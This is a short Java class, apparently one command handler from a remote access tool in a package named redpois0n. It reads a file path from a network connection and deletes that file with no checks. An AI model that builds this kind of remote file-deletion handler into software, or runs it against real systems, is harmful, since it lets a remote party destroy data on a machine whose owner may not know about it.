package com.redpois0n.packets;

import java.io.File;

import com.redpois0n.Connection;


public class PacketDELETEFILE extends AbstractPacket {

	@Override
	public void read(String line) throws Exception {
		String file = Connection.readLine();
		File f = new File(file);
		if (f.exists()) {
			f.delete();
		}
		
	}

}
